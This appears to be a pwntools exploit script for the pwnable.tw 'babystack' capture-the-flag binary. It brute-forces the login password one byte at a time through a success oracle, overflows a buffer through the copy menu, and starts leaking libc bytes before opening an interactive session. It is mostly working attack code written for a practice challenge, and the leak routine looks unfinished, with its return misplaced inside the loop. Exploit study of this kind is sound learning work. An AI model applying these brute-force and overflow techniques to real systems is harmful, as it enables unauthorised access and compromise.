import pwn
from pwn import *

context.binary = "babystack"
context.log_level = "DEBUG"
elf = ELF("./babystack")
p = elf.process()
#p = gdb.debug("./babystack")
#p = remote("chall.pwnable.tw", 10205)
libc = ELF("./libc_64.so.6")
setvbuf = libc.sym["setvbuf"]


def login(payload):
 p.sendlineafter(b">> ",b"1")
 p.sendlineafter(b"Your passowrd :",payload)
 p.recvline()


def fix():
 p.sendline(b"1")

def copy(data):
 p.sendlineafter(b">> ",b"3")
 p.sendlineafter(b"Copy :",data)
 p.recvline()

def brute(length):
    password = b""
    for l in range(length):
        found = False
        for i in range(0x10):
            for j in range (1,0x100):
                p.sendafter(b">> ",b"1")
                p.sendlineafter(b"Your passowrd :", password + bytes([j]))
 
                if(p.recvline() == b"Login Success !\n"):
                    password += bytes([j])
                    p.sendafter(b">> ",b"1")
                    found = True
                    break
            if found:
                break
    return password

password = brute(16)
print(password)
pwn.gdb.attach(p, '''
    brva 0xEBB
''')
payload = b"\x00"+b"A"*71
login(payload)
data =  b"A"*63
copy(data)
p.recvuntil(b">> Invalid choice\n")
fix()

def leakc(length):
 libc = b""
 for l in range(length):
        found = False
        for i in range(6):
            for j in range (1,0x100):
                p.sendafter(b">> ",b"1")
                p.sendlineafter(b"Your passowrd :", b"A"*8 + libc + bytes([j]))

                if(p.recvline() == b"Login Success !\n"):
                    libc += bytes([j])
                    found = True
                    break
            if found:
                break
            fix()       
        return libc
libc = leakc(6)
print(libc)

p.interactive()
